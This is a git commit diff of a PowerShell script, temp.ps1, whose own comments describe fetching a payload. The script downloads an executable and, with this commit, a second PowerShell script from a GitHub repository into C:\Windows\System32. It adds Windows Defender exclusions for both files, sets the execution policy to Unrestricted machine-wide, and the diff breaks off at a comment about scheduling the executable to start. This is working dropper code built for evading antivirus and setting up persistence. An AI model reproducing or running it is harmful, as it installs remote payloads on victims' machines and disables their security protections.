1d621fa6b675e9d7f59369baaa0cc683db24e1ac
mrnobody59420-hub <mr.nobody59420@gmail.com>
2025-11-20 01:31:47 -0500

    Update temp.ps1

--- temp.ps1
+++ temp.ps1
@@ -1,8 +1,9 @@
 # fetch payload from github
 Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
-Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
+Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/ddrcc.ps1' -OutFile "C:\Windows\System32\ddrcc.ps1"
 # add exlusion to file
 Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
+Add-MpPreference -ExclusionPath "C:\Windows\System32\ddrcc.ps1"
 # set execution policy
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
 # add schedule to start exe
